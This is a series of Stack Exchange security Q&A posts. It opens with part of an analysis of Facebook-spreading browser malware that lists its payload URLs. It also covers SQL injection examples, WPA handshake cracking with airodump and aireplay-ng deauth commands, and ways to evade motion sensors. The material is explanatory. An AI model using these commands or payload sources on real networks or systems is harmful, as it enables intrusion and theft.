<p>The malware appears to be partially incomplete or otherwise underdeveloped or perhaps based off some other malware (quality is very low). Many of the autoit scripts don't actually do anything, and what appears to be a ZIP meant to contain a Firefox extension is actually empty. The autoit scripts are a ton of includes combined into a single file, but only one (ekl) actually has a payload at the end.</p>

<p>The one active autoit script which runs on infection replaces the Chrome, IE, and possibly other browser shortcuts with a shortcut to Chrome with the necessary arguments to run the malicious Chrome extension.</p>

<p>The Chrome extension is mainly how this malware is being propagated. It does some nasty things like blacklisting antivirus software domains, and sending Facebook messages automatically. Actually there was a webservice back end at <code>http://appcdn.co/datajs</code> serving some scripts which would be injected on any page a user visited based on the URL currently being viewed, which was how the Facebook messages were being posted. This services is now offline, likely taken down.</p>

<blockquote>
  <p>Is this an exploit on Facebook?</p>
</blockquote>

<p>Not exactly, more-like abuse of Facebook. Facebook's code hasn't been exploited, your friend just has an infect browser phishing their contacts on their behalf.</p>

<blockquote>
  <p>Is it possible that my friend got a virus which targets their contacts by tagging them on malicious links?</p>
</blockquote>

<p>Yep, that's exactly how this malware is spreading itself.</p>

<blockquote>
  <p>Should I report this to Facebook? If so, how?</p>
</blockquote>

<p>Yes, see <a href=""https://www.facebook.com/help/181495968648557"">How to Report Things</a> in the Facebook help center.</p>

<p>Getting the following URL's taken offline by contacting their hosts would also be good.</p>

<pre><code>http://userexperiencestatics.net/ext/Autoit.jpg
http://userexperiencestatics.net/ext/bg.jpg
http://userexperiencestatics.net/ext/ekl.jpg
http://userexperiencestatics.net/ext/ff.jpg
http://userexperiencestatics.net/ext/force.jpg
http://userexperiencestatics.net/ext/sabit.jpg
http://userexperiencestatics.net/ext/manifest.jpg
http://userexperiencestatics.net/ext/run.jpg
http://userexperiencestatics.net/ext/up.jpg
http://whos.amung.us/pingjs/?k=pingjse346
http://whos.amung.us/pingjs/?k=pingjse3462
http://appcdn.co/datajs
</code></pre>

<p><s>Unfortunately, CloudFlare still has not taken the <code>userexperiencestatics.net</code> URL's down though I contacted then shortly after posting this answer, and I don't know who is actually hosting these files.</s> CloudFlare just emailed me to say they restricted access to the files, and says they will notify the host.</p>

<p><strong>UPDATE:</strong></p>

<p>After I and likely others reported the <code>.jse</code> URL to Google, they appear have taken down the file. If you find any more copies, those should also be reported. It seems people have been receiving the files from numerous sources.</p>

<p><strong>MORE INFO:</strong></p>

<p>This malware and post is getting a lot of attention, so I'll add some more info to address people's questions:</p>

<blockquote>
  <p>Will this file automatically run when downloaded?</p>
</blockquote>

<p>Probably not unless you have configured your browser to do so. It is meant to trick you into opening it.</p>

<blockquote>
  <p>Can it infect my phone, or non-Windows computer.</p>
</blockquote>

<p>As far as I know, Windows is the only OS which can run this malware. As I mentioned, it uses the Windows Script Host. I don't believe even Windows phone is vulnerable, though I don't know much about Windows phone.</p>

<p><strong>UPDATE ON RANSOMWARE:</strong></p>

<p>Previously it was assumed the autoit scripts contained ransomware, however after further inspection this appears not to be the case. There is just a bunch of unused crypto function obscuring <a href=""https://pastebin.com/MG0btZ6Q"">the actual payload</a>, which I've mostly <a href=""https://pastebin.com/R28ttfWP"">deobfuscated to this</a>.</p>

<p><strong>UPDATE ON CHROME EXTENSION:</strong></p>

<p>The unpacked Chrome extension code <a href=""https://pastebin.com/su5smhrh"">can be viewed here</a>. Details on what it did integrated above.</p>

<p><strong>UPDATE FOR JSE SCRIPT:</strong></p>

<p>My de-obfuscated <code>comment_24016875.js</code> script <a href=""https://pastebin.com/kV8ixxuN"">can be viewed here</a>.</p>
","128270"
"Can a steel woven wallet prevent RFID scanning of credit card information?","38608","","<p>According to the Popular Mechanics article <a href=""http://www.popularmechanics.com/technology/how-to/4206464"">RFID Credit Cards and Theft: Tech Clinic</a>, the fact that many new credit/debit cards have a RFID chip embedded on it, there is a risk (albeit, small according to the article) that the card would be 'skimmed' - from the article:</p>

<blockquote>
  <p>RFID cards do have a unique vulnerability. ""Your card can be read surreptitiously. Unless you were paying attention to the guy behind you with a reader, you'd never know you were being skimmed."" </p>
</blockquote>

<p>Now, even though the risk is low, there is always a chance.  With that in mind, a friend bought me a wallet - a <a href=""http://www.graysonline.com/retail/ssbw001/homewares-and-gifts/stainless-steel-rfid-blocking-wallet?source=googleps&amp;gclid=CMr66qzD_LkCFQgSpAodjWUAJQ"">Stainless Steel RFID Blocking Wallet</a> to be precise, that claims to</p>

<blockquote>
  <p>prevents 'accidental' reading of your information </p>
</blockquote>

<p>I have this wallet still (it is rather nice looking), so my question is really two-fold:</p>

<ul>
<li>Can a steel woven wallet prevent RFID scanning of credit card information?</li>
</ul>

<p>and</p>

<ul>
<li>Is there a practical way I can test this myself?</li>
</ul>

<p><em>(Note: I have no affiliation with anything to do with the manufacture or sale of these wallets)</em></p>
","<p>Any <a href=""http://en.wikipedia.org/wiki/Faraday_cage"">Faraday cage</a> will do the trick. So a shielding of just about anything conductive, be it aluminum foil, conductive paint, wire mesh, or any of a number of similar alternatives is going to be opaque to radiation. That means no radio waves in or out, which means the RFID signal is blocked.</p>

<p>Note that the size of the mesh has to be significantly smaller than the wavelength in question; RFID specs are mostly in the MHz range but go as high as 2.4GHz, which is about a 10cm wavelength. So your mesh should be just fine. But aluminum foil is cheaper. </p>
","43325"
"Microsoft Windows RPC (135/tcp) security risks","38589","","<p>I was running a vulnerability scan against a Windows Server of mine, TCP port 135.
I got the following output: </p>

<blockquote>
  <p>By sending a Lookup request to the portmapper TCP 135 it was possible
  to enumerate the Distributed Computing Environment services running on
  the remote port. Using this information it is possible to connect and
  bind to each service by sending an RPC request to the remote
  port/pipe.</p>
</blockquote>

<p>So now I have the following questions:</p>

<ul>
<li>How can someone connect and bind to each service? What is the command/tool to use, and does it require authentication?</li>
<li>What are the security risks of having this service running, if any?</li>
</ul>
","<ul>
<li>How can someone connect and bind to each service? What is the command/tool to use, and does it require authentication?</li>
</ul>

<p>The <code>net use</code> command, browsing network shares, or any other SMB-related command will make use of these services.</p>

<ul>
<li>What are the security risks of having this service running, if any?</li>
</ul>

<p>It's often a necessary service to have running as it provides the backbone of a great deal of Windows network sharing services. I wouldn't be concerned so much on it running as I would be concerned if it were exposed outside your network. I believe service enumeration and possible undocumented exploits are the two current risks. Because this is a remote procedure call service, it does have some of the same excitement as any application service -- think of requests passed there in terms of a web query. They ask for a service (page) and pass certain relevant parameters (GET or POST options). Something on the service's back-end runs and returns a result.</p>

<ul>
<li>See also <a href=""http://isc.sans.edu/port.html?port=135"" rel=""noreferrer"">http://isc.sans.edu/port.html?port=135</a></li>
</ul>
","8007"
"Possible to use both private key and password authentication for ssh login?","38327","","<p>It seems that they are mutually exclusive, as disabling one gives me the other, and vice versa.  Two-factor auth for my ssh servers sounds really nice, so is there any way to accomplish this?</p>
","<p>With recent Fedora and RHEL 6 releases, you can use <code>RequiredAuthentications2 pubkey,password</code> to require both pubkey <em>and</em> password authentication. Usually this is done to require pubkey and 2-factor authentication token, not the user's password.</p>

<p>Update: Now on RHEL / CentOS 7, and any system with a recent version of OpenSSH, you can use:</p>

<pre><code>AuthenticationMethods ""publickey,password"" ""publickey,keyboard-interactive""
</code></pre>

<p>It's also possible to <a href=""https://serverfault.com/a/774817/267333"">use the Match directive to exclude IPs</a> or Users.</p>
","26211"
"How to determine if it is safe to install apk files from alternative android app stores?","38254","","<p>Several sites offer APK downloads (<a href=""http://www.appsapk.com/"" rel=""nofollow"">1</a>, <a href=""http://slideme.org/"" rel=""nofollow"">2</a>, <a href=""https://f-droid.org/"" rel=""nofollow"">3</a>). Is there a way to determine if a given website/apk is safe to install?</p>
","<h1>Initial Analysis</h1>

<hr>

<p>I think the most thorough way to test 3rd party apps is to:</p>

<ol>
<li>Download the <a href=""https://developer.android.com/sdk/installing/index.html"" rel=""nofollow noreferrer"">Android SDK/Tools</a></li>
<li><a href=""https://developer.android.com/tools/devices/index.html"" rel=""nofollow noreferrer"">Create a virtual Android Device</a> with the <a href=""http://www.wikihow.com/Check-What-Android-Version-You-Have"" rel=""nofollow noreferrer"">Android version of your phone</a>.</li>
<li><a href=""https://stackoverflow.com/a/16707217/3714897"">Enable Android Debugging through USB</a> on your device. (Can be turned off later)</li>
<li>Check with <a href=""https://developer.android.com/tools/help/adb.html"" rel=""nofollow noreferrer"">ADB</a> that your emulator is detected: <code>adb devices</code></li>
<li>Install the 3rd party app with ADB: `adb install </li>
</ol>

<p>You can analyze what's going on in the device using different logs that are constantly running.  These can be tough to capture, but you can capture the <code>logcat</code> of your device with <code>adb logcat</code>.  You can learn how to use <a href=""http://forums.androidcentral.com/general-help-how/141073-learn-logcat-like-pro.html"" rel=""nofollow noreferrer"">Logcat like a Pro</a>.</p>

<p>The Android Virtual Device (AVD) uses your internet connection like a WiFi connection.  At this point you can perform all kinds of analysis.  My post on <a href=""https://security.stackexchange.com/questions/91990/how-do-i-find-vulnerabilities-in-software/92003#92003"">how to analyze malware</a> could be helpful (as far as tools and techniques to use).  <a href=""http://www.linuxjournal.com/content/monitoring-android-traffic-wireshark"" rel=""nofollow noreferrer"">Wireshark</a> will be a helpful tool to analyze network traffic.  See what the app with its networking connections.</p>

<h1>Reverse Engineering</h1>

<hr>

<p>So now you'll be getting down and dirty into seeing what exactly the APK is doing.  For this you'll need a few tools.  Here is an <a href=""http://www.decompileandroid.com/"" rel=""nofollow noreferrer"">online tool</a> (I have not used it) that claims to decompile an Android APK back into its Java code.  If you would like to understand the process and do it yourself I would look at <a href=""https://stackoverflow.com/questions/21010367/how-to-decompile-a-apk-or-dex-file-on-android-platform"">this Stack Overflow answer</a>. </p>

<p>An APK is just a <code>.zip</code> file.  So the steps (with tools from that Stack Overflow answer)</p>

<ol>
<li><code>unzip example.apk</code></li>
</ol>

<p>Now we have the following files and directories:</p>

<pre><code>-rw-rw-r--  1       3708 Oct 14  2013 AndroidManifest.xml
-rw-rw-r--  1    2751916 Oct 14  2013 classes.dex
drwxrwxr-x  2       4096 Aug  3 12:12 META-INF
drwxrwxr-x 23       4096 Aug  3 12:12 res
-rw-rw-r--  1     363640 Oct 14  2013 resources.arsc
</code></pre>

<p>The <code>classes.dex</code> is what we want.  It contains all the Java classes used for the application.  </p>

<ol start=""2"">
<li><code>./d2j-dex2jar.sh ../example.apk</code></li>
</ol>

<p>Now we have a <code>./example-dex2jar.jar</code> JAR file that can be decompiled into Java code.  Here is where JD-GUI and ApkTool can be useful.  Now you can look at the exact code that is executed by the APK.</p>

<p>Keep in mind though that some portions (if not most) of the Java code will be obfuscated.  This is common and you'll often see function symbols ripped out and replaced with <code>a</code>, <code>b</code>, etc.  Not only functions, but packages, methods, variables.  Seeing obfuscated Java like <code>z = (a) b.d()</code> would not be uncommon.  But you can see strings, typical imports, and any JNI shared object functions they may use.</p>

<hr>

<p>All that being said.  Do you want to do that for every app you download?  Probably not.  It comes down to whether you trust the Store that you're using, and/or the software company that put out the app.  I personally don't use any apps outside of the Google Play store.  The Apps I do download I base on companies that developed them, user reviews (these can be faked), friend/forum recommendations, etc.  </p>

<p>You have to give some sort of trust to the app you're downloading, or analyze each and every app you install.  Either way you've got to use caution.</p>
","95811"
"How can a website find my real IP address while I'm behind a proxy?","38214","","<p>I just wonder how some website like <a href=""http://whatismyip.com"">WhatIsMyIP</a> find out what your real IP address is, even if you use proxy server. It said : </p>

<blockquote>
  <p>Proxy Detected</p>
</blockquote>

<p>and then they give your real IP address. </p>

<p>Is it possible they use JavaScript to send HTTP request for not using web browser proxy settings(How could it be implemented by Java) or there is some magic technique?</p>
","<p>There are several ways:</p>

<ul>
<li>Proxy headers, such as <code>X-Forwarded-For</code> and <code>X-Client-IP</code>, can be added by non-transparent proxies.</li>
<li>Active proxy checking can be used - the target server attempts to connect to the client IP on common proxy ports (e.g. 8080) and flags it as a proxy if it finds such a service running.</li>
<li>Servers can check if the request is coming from an IP that is a known proxy. WhatsMyIP probably has a big list of these, including common ones like HideMyAss.</li>
<li>Web client software (e.g. Java applets or Flash apps) might be able to read browser settings, or directly connect to a web service on the target system (bypassing the proxy) to verify that the IPs match.</li>
<li>Mobile app software can identify the client IP. Example: <a href=""https://github.com/salbahra/NetworkInterfacePlugin/"">PhoneGap plugin</a></li>
</ul>
","36422"
"SQL injection -- why isn't escape quotes safe anymore?","38157","","<h2>Raw SQL</h2>

<p>When you're writing SQL -- for anything that takes human input really, a lot of things have been done to avoid the injection.</p>

<p>Everyone that's heard of SQL injection knows that (I'm going to use PHP as a sample) doing something like this isn't safe:</p>

<pre><code>$sql = ""SELECT * FROM `users` 
.  WHERE `userName` = ""{$_POST[""username""]}"" 
.  AND `pass` = ""{$_POST[""pass""]}"";"";
</code></pre>

<h2>Magic</h2>

<p>Then of course, someone came out with the idea of using ""magic escape quotes"" to deal with program input that wasn't sanitized correctly and directly put into sql as a result of bad practices. This didn't really solve the issue with SQL injection, but it did mean all user input got mangled up.</p>

<h2>Adding slashes</h2>

<p>So, some people turned off magic quotes. Then, they parsed user input before the point of SQL through <code>addslashes()</code> which in theory escapes all the quotes and your hacker can't do <code>' OR 1=1</code>, but even the documentation for addslashes it's self say that you shouldn't use addslashes, it says use the database-specific function such as <code>mysql_real_escape_string()</code>, but this is still said to not be enough by some.</p>

<h2>Adding slashes specific to Database</h2>

<p>So, we can't use DBMS specific <code>*_real_escape_string</code>, we can't use <code>add slashes</code>, the ""magic quotes"" thing caused lots of issues, and the web is full of short worded quotes such as:</p>

<blockquote>
  <p>""A dedicated hacker will find a way to
  jump through your quote-escaping loops,
  just use the DBAL prepared statements"" - John Q any programmer</p>
</blockquote>

<p>Okay, so that scared me enough to use prepare statements and a DBAL. It didn't really explain anything, but it sounds good because I've heard it a lot.</p>

<h2>Prepared statements</h2>

<p>So now we're using PDO, or a DBAL from a framework, or something else that wraps all our sql and makes sure someone can't run an sql injection.</p>

<p>My question is basically a ""why not?"", not a ""what should I use?"". The web's full of people telling you to use this or use that or <em>whatever</em>, but no explanations of why these things had to happen.</p>

<h2>Direct questions</h2>

<p>Pointed questions (reminder, I'm asking about SQL, PHP was an example language because of it's bad rep around SQL, concepts are universal):</p>

<ol>
<li>Why can't we escape all user input using ""magic"" ?</li>
<li>Why wasn't addslashes ""good enough""?</li>
<li>Whats wrong with using DB-specific escape functions, and why was it better than addslashes?</li>
<li>Why are prepared statements with frameworks and PDO being hailed as the gold standard of SQL? Why are they better? Why can't I do an SQL injection with these, where as I COULD have with the previously mentioned means? Can a programmer not <strong>somehow</strong> manage to still screw this up? What should they look out for?</li>
<li>Any other concerns I haven't brought up?</li>
</ol>
","<blockquote>
  <p>Why can't we escape all user input using ""magic""?</p>
</blockquote>

<p>At the time the magic is applied, it is unknown where the data will end up. So magic quotes are destroying data that, unless it is written unescaped to a database.</p>

<p>It may just be used in the HTML response sent back to the client. Think of a form that has not beem filled in completely and is therefore shown again to the user. With magic quotes, the data entered on the first attempt will now be SQL escaped, which is meaningless on an HTML page. Even worse: on the second submission the data is SQL escaped again.</p>

<blockquote>
  <p>Why wasn't addslashes ""good enough""?</p>
</blockquote>

<p>It has issues with multibyte characters:</p>

<pre><code>' 27
\ 5c
뼧 bf 5c
</code></pre>

<p>Those are two bytes, but only one Unicode character.</p>

<p>Since <code>addslashes</code> does not know anything about Unicode, it converts the input <code>bf 27</code> to <code>bf 5c 27</code>. If this is read by a Unicode-aware program, it is seen as 뼧'. Boom.</p>

<p>There is a good explanation of this issue at <a href=""http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string"">http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string</a></p>

<blockquote>
  <p>Whats wrong with using DB-specific escape functions, and why was it better than addslashes?</p>
</blockquote>

<p>They are better because they ensure that the escaping interprets the data in the same way the database does (see the last question). </p>

<p>From a security point of view, they are okay if you use them for every single database input. But they have the risk that you may forget either of them somewhere.</p>

<p><strong>Edit</strong>: As getahobby added: Or that you use xxx_escape_strings for numbers without adding quotation marks around them in the SQL statement and without ensuring that they are actual numbers by casting or converting the input to the appropriate data type <strong>/Edit</strong></p>

<p>From a software development perspective they are bad because they make it a lot harder to add support for other SQL database server software.</p>

<blockquote>
  <p>Why are prepared statements with frameworks and PDO being hailed as the gold standard of SQL? Why are they better? </p>
</blockquote>

<p>PDO is mostly a good thing for software design reasons. It makes it a lot easier to support other database server software. It has an object orientated interface which abstracts many of the little database specific incompatibilities.</p>

<blockquote>
  <p>Why can't I do an SQL injection with these [prepared statements], where as I COULD have with the previously mentioned means?</p>
</blockquote>

<p>The ""<strong>constant query with variable parameters</strong>"" part of prepared statements is what is important here. The database driver will escape all the parameters automatically without the developer having to think about it.</p>

<p>Parametrized queries are often easier to read that normal queries with escaped parameters for syntactic reasons. Depending on the environment, they may be a little faster.</p>

<p>Always using prepared statements with parameters is something that can be validated by <strong>static code analysis tools</strong>. A missing call to xxx_escape_string is not spotted that easily and reliably.</p>

<blockquote>
  <p>Can a programmer not somehow manage to still screw this up? What should they look out for?</p>
</blockquote>

<p>""Prepared statements"" imply that the are <strong>constant</strong>. Dynamically generating prepared statements - especially with user input - still have all the injection issues.</p>
","3633"
"How exactly does 4-way handshake cracking work?","38133","","<p>From my understanding this is how WPA2 works for home networks: </p>

<ul>
<li>PSK (Pre-Shared Key) is used to generate PMK (Pairwise Master Key), which is used together with ANonce (AP Nonce) to create PTK (Pairwise Transient Key). </li>
<li>PTK is devided into KCK (Key Confirmation Key, 128 bit), KEK (Key Encryption Key, 128 bit) and TEK (Temporal Encryption Key, 128 bit).</li>
<li>KCK is used to construct MAC in EAPOL packets 2,3 and 4.</li>
<li>KEK is used to encrypt some data sent to client(for example GTK).</li>
<li>TEK is used for encrypting traffic between client and AP, later during session.</li>
</ul>

<p>Now the WPA 4-way handshake:</p>

<ol>
<li>AP sends ANonse (AP Nonce) to client, which is basically a random Integer of 256 bits.</li>
<li>Client use the ANonce and PMK to generate PTK (Pairwise Transient Key), and send CNonce (Client Nonce) and MAC.</li>
<li>AP sends MAC and GTK (Group Temporal Key) to client.</li>
<li>Client send ACK with MAC.</li>
</ol>

<p>Now, how does handshake cracking work (for example dictionary attack) if the whole PTK isn't used (KCK and KEK are used during handshake, but TEK isn't)?
I understand that the words from dictionary are used as PSK to generate PMK and Anonce (which is also captured in handshake) to generate PTK, but how can I know when PTK is correct when 1/3 of the key is never used?</p>
","<p>Short answer is, 4-way handshake password ""cracking"" works by checking MIC in the 4th frame. That is, it only checks that KCK part of the PTK is correct. 4-way handshake doesn't contain data that would allow checking of other parts of the PTK, but that's actually not needed, for two reasons:</p>

<ol>
<li>MIC verification is how AP checks the validity of PTK (and, consequently, the password);</li>
<li>Chances of a password producing PTK that has valid KCK but invalid other parts are really low: KCK is 128 bits, so probability of incorrect password producing correct KCK is 2^-128.</li>
</ol>

<p>Overall, 4-way password ""cracking"" works like this:</p>

<ol>
<li>4-way handshake is parsed to get SP and STA addresses, AP and STA nonces, and EAPOL payload and MIC from 4th frame;</li>
<li>Candidate password is used to compute PMK;</li>
<li>PTK is computed from PMK, AP and STA addresses and nonces;</li>
<li>KCK from computed PTK is used to compute MIC of the EAPOL payload obtained at step 1;</li>
<li>Computed MIC is compared to the MIC obtained at step 1. If they match then candidate password is reported as correct.</li>
</ol>

<p>If you'd like to see actual implementation of the attack, one place to start is <a href=""http://wirelessdefence.org/Contents/coWPAttyMain.htm"" rel=""noreferrer"">coWPAtty</a> sources: they're relatively small, self-contained, and easy to read.</p>
","66029"
"No Handshake from Airodump","38058","","<p>I'm struggling to get a handshake from my router when using airodump. I'm running this from Kali Linux live CD.</p>

<p><code>airmon-ng</code> shows my wireless card is an <code>Atheros AR9462</code> using the <code>ath9k - [phy0]</code> driver. I believe this supports packet injection. <code>aireplay-ng --test wlan0</code> and <code>aireplay-ng --test mon0</code> show injection is working.</p>

<p>So, I'm attempting to crack the WPA2 PSK on my local network. I use:</p>

<p><code>airodump-ng -w output --bssid MY_BSSID mon0 -c 6</code></p>

<p>I've confirmed the BSSID and channels are correct.</p>

<p>I have my MacBook connected to my network, and it shows up when airodump is running. I wait until the #Data column shows about 5,000 then I send deauth packets whilst airodump is still running:</p>

<p><code>aireplay-ng --deauth 1 -a AP_BSSID mon0</code></p>

<p>I send one, wait a few moments and send another. I get no handshake. I've repeated, and still nothing. I've tried to send 100, but it just disconnects my laptop from the network (not a good idea lol).</p>

<p>I can't figure out what's going wrong. I've followed 2 different guides, and watched a video from BT that all show they're able to get a handshake.</p>

<p>Any ideas?</p>

<p><strong>Edit:</strong> mon0 is in monitor mode.</p>
","<p>The process you've described <em>should</em> result in handshake packets, assuming that the deauth packets are successful in forcing the device to re-attach to the network. A couple of suggestions.</p>

<ul>
<li>I'm guessing that placement of all the devices is ok (e.g they're quite near to each other physically).  If the device in monitor mode is further away there's always a risk that it wont see all the traffic.</li>
<li>I'd suggest getting a couple of devices (your macbook and perhaps a phone or tablet) and shutting them down and then re-start them.  When a device starts up and connects to the network it definitely should send a handshake packet.  If you don't see one then, does suggest something more fundamental is wrong (although off the top of my head not sure what !)</li>
</ul>

<p>Typically when I do this on engagements, I'll leave airodump running for a couple of hours or more, and on a relatively busy network it'll see some devices connecting. DeAuth is a useful idea but I'm always a bit leary of knocking people off the network.</p>
","57276"
"Feeding /dev/random entropy pool?","37927","","<p>Which way of additionally feeding <code>/dev/random</code> entropy pool would you suggest for producing random passwords? Or, is there maybe a better way to locally create fully random passwords?</p>
","<p>You can feed it with white noise from your sound chip, if present. See this article: <a href=""http://www.linuxfromscratch.org/hints/downloads/files/entropy.txt"">http://www.linuxfromscratch.org/hints/downloads/files/entropy.txt</a></p>
","207"
"Is making a clean install enough to remove potential malware?","37919","","<p>Is formatting the disk and reinstalling the system from scratch (to Ubuntu) enough to remove any potential hidden <strong>software</strong> spyware, keyloggers etc.?</p>

<p>Or can something still persist installed in the bios or something like that? What to do then?</p>

<p>To be clear, not concerned about common malware. The question is more specific about a machine to which people other than the user had physical access for many hours. So when the user returns cannot be sure that nothing changed, so the user makes a fresh install after some weeks. Is that enough to ""clean"" it?</p>

<p>Hardware keyloggers are not part of this question as they should continue after software reinstallation.</p>
","<p>It is <em>possible</em> for malware to persist across a re-format and re-install, if it is sufficiently ingenious and sophisticated: e.g., it can persist in the bios, in the firmware for peripherals (some hardware devices have firmware that can be updated, and thus could be updated with malicious firmware), or with a virus infecting data files on removable storage or on your backups.</p>

<p>However, most malware doesn't do anything quite this nasty.  Therefore, while there are no guarantees, re-formatting and re-installing should get rid of almost all malware you're likely to encounter in the wild.</p>

<p>Personally, I would be happy with re-formatting and re-installing.  It's probably good enough in practice.</p>
","7207"
"What are the advantages and disadvantages of different types of motion sensors?","37866","","<p>I understand there are a number of different motion sensor technologies out there, including Active Infrared (AIR), Passive Infrared (PIR), Microwave and Ultrasonic motion sensors. </p>

<p>I would like to know what the advantages and disadvantages of these different types of motion sensors are and what (if any) vulnerabilities exist in them. </p>

<p>Additionally, have I overlooked any other similar motion sensing devices?</p>

<hr>

<p>Edit: just to clarify, human based motion sensors is what im interested in. Practical, non-theoretical technologies. This question isn't to do with vibration sensors, glass break sensors etc</p>

<p>Edit: To limit the scope somewhat, lets stick to more common types of motion sensors rather than exotic situation specific types?</p>
","<p>There are other types of motion detection methods like vibration detection, optic-based motion detection, and magnetic-based motion detection.
I'm not familiar with all of these technologies, so I'll just approach the ones I've studied/played with before.</p>

<ul>
<li><p><strong>PIR (Passive Infrared):</strong> They measure the change in the energy of the surrounding area. They're prone to false positives due to being sensitive to environmental changes like hot/cold air flow and sunlight. They're easily defeated by blocking the body heat emission. If the adversary wearing a heat-insulating full-body suit or move with a styrofoam sheet, they will pass without triggering the sensor.</p></li>
<li><p><strong>AIR (Active Infrared):</strong> They mainly have two implementation. <strong>Proximity sensors</strong>, used in the automatic trash bin, automatic water taps, and different others; and <strong>motion sensors</strong>. In AIR-based motion sensors, an IR emitter sends a beam of IR which will be received by an IR receiver, when the beam is interrupted, a motion is detected. Due to the way they're implemented (monitoring a specific scope) they're less prone to false positives. Their main disadvantage is detectability, they can be easily ""seen"" using a regular camera (your phone's camera works) or any IR detection mechanism, after that they can be easily avoided. In some cases, they might be impossible to avoid (they're monitoring the only door to a room), the adversary can detect the source of the beam and find the receiver, then emit a beam of their own. Some AIR-based motion sensors emit IR in a pattern of a certain frequency to make it difficult to replicate, but of course the adversary can learn that pattern and replay it to the receiver.</p></li>
<li><p><strong>Optic-based:</strong> Basically a camera watches an area and it's recording at a certain framerate, each frame (or several frames) are analyzed by an algorithm that can detect the difference between the last frames. If something is different, a motion is detected. They can be overcome with utilizing shadows and exploiting backgrounds with a solid color. That, of course, can be solved with using thermal imaging and/or installation-specific measures (eliminating shadows with controlled light). There's a lot of <a href=""http://people.csail.mit.edu/mrub/vidmag/"">cutting-edge research in this area, especially in video amplification.</a> Researchers at MiT were able to <a href=""https://www.youtube.com/watch?v=ONZcjs1Pjmk"">detect a person's heart rate from a normal video footage.</a></p></li>
<li><p><strong><a href=""https://en.wikipedia.org/wiki/Piezoelectric_sensor"">Piezoelectric:</a></strong> I personally haven't seen or used those. They basically use the piezoelectric effect (mechanical forces having an electrical effect on some materials). They can be mounted on the floor in order to detect pressure and vibration. They're vulnerable to <a href=""http://dragonball.wikia.com/wiki/Flying_Nimbus"">Flying Nimbus</a> attacks.</p></li>
<li><p><strong>Ultrasonic:</strong> They work by emitting an ultrasonic ""beam"". They work the same way as a <a href=""https://en.wikipedia.org/wiki/Sonar"">sonar</a>. They can be defeated by wearing an <a href=""https://en.wikipedia.org/wiki/Anechoic_tile"">anechoic suit</a>.</p></li>
</ul>

<p>But to be honest, I don't think that the biggest security risk in motion-detection technology is in the sensing mechanism itself. I'd be more worried about the software/hardware controlling it, and the implementation itself.</p>
","35354"
"How does Team Viewer establish a Remote Desktop Connection?","37722","","<p>I am wondering how is it possible for Team Viewer to establish the remote desktop connection over the internet even if the user has not enabled the 3389 port ?</p>

<p>I am searching over the internet but didn't find the satisfied answer to my question ? How does it even possible to establish RDP over the internet since it is only possible across the network ?</p>

<p>Does Team Viewer use Reverse Connection technique ?
Is it possible to establish the RDP connection with someone who is outside the network ?</p>
","<p>To elaborate on ewanm89's post, TeamViewer does use UDP pinholeing.</p>

<p>UDP is a stateless protocol. This means packets are fired off at their target with no verification (at the protocol level) that they were received or even reached the destination. Firewalls are designed to look for UDP packets and record the source and destination as well as the timestamp. If they see an inbound packet that matches an outbound packet they will generally allow the packet through even without a specific rule being placed in the firewall's access list. This can be locked down on enterprise grade devices, but in general 90% of the firewalls out there will allow return traffic.</p>

<p>In order to pin hole your machine (viewer) has a TCP connection back to the main TeamViewer server. The target machine (client) also has a TCP connection to the main TeamViewer Server. When you hit connect your machine tells the main server its intention. The main server then gives you the IP address of the client machine. Your machine then begins firing UDP packets at the client. The client is signaled that you intend to connect and is given your IP. The client also starts firing UDP packets at you.</p>

<p>This causes both firewalls (yours and the clients) to allow the traffic, thus ""punching holes"" in the firewall.</p>

<p>Of course TeamViewer adds some security by doing a pin/password check before the main server sends the IP info to both parties but you get the idea.</p>
","14959"
"Is this ""Domain Registration Service"" email a scam?","37706","","<p>I received an email to the email address listed on our website (it's a generic <strong>info@ourcompany.com</strong> to help ""weed out"" spam, whereas each employee has something like <strong>andreas@ourcompany.com</strong> to which I manually forward any ""real"" email that comes in through the website.)</p>

<p>I received the following email (with actual names replaced with placeholders):</p>

<blockquote>
  <p>Dear Sir,</p>
  
  <p>We are the department of Asian Domain Registration Service in China. I have something to confirm with you. We formally received an application on April 14, 2014 that a company which self-styled <strong>""Some Other Corp. Ltd.""</strong>. were applying to register some <strong>""ourcompany""</strong> Asian countries top-level domain names.</p>
  
  <p>Now we are handling this registration, and after our initial checking, we found the name were similar to your company's, so we need to check with you whether your company has authorized that company to register these names. If you authorized this, we will finish the registration at once. If you did not authorize, please let us know within 7 workdays, so that we will handle this issue better.</p>
  
  <p>Best Regards,<br>
  <strong>Some Fake Person</strong></p>
</blockquote>

<p>The email is ""plain"" (no attachments, no embedded images, just some basic HTML), the email address is ""normal"" and not consisting of random characters.</p>

<p>Is this a common email scam; and if so, what is their motive?</p>
","<p>Yes, this email is a scam. Ignore it!</p>

<p>I work at a major web hosting firm, and our customers receive these emails on a frequent basis. There are a number of characteristics that are visible from this perspective which confirm that they are a scam:</p>

<ol>
<li><p>The emails are never sent by a recognizable, reputable domain registrar. Most of them use generic names, such as ""Asian Domain Registration Service"" in your email, ""China domain registration center"", or the like. The emails never have senders, headers, or signatures which explicitly link them with a registrar, and there is usually not even any accredited registrar with the right name.</p></li>
<li><p>The domain registrations are never being made by a recognizable company or organization. You've obscured the relevant name as ""Some Other Corp, Ltd"" here, but the names are often generic (""Foo Trading Co"") or incomprehensible (""FANGSHI Co""). Attempts to identify or contact them are never successful (or find only unrelated companies).</p></li>
<li><p>They are frequently sent in relation to a domain name which would be meaningless under an Asian top-level domain. Many of them involve domain names containing names of people or locations — for example, these types of emails might claim that a Chinese trading company is attempting to register the domain ""johndoe-hardware.hk"" or ""newyork-blahblah.asia"". There is no apparent logic to these registrations.</p></li>
<li><p>Despite supposedly coming from many different registrars, these emails always follow a very similar format. There are multiple templates, so the wording can vary, but the formula is always precisely the same. In particular, the domain names being registered are ALWAYS only under ""Asian"" TLDs (typically <code>.asia</code>, <code>.cn</code>, <code>.hk</code>, <code>.tw</code>, and <code>.in</code>), never under any other TLDs. Additionally, many of these emails also claim that the bundle includes an ""Internet keyword"" or ""Internet trademark"", which doesn't even exist.</p></li>
</ol>

<p>We have advised a very large number of our customers to disregard these emails, and not once has any of the domains mentioned actually been purchased by the individual or company that was supposedly attempting to acquire them. None of the people who have written about receiving these emails online has had this outcome, either. Everything points to these emails being a widespread scam!</p>

<hr>

<p>Further reading:</p>

<ul>
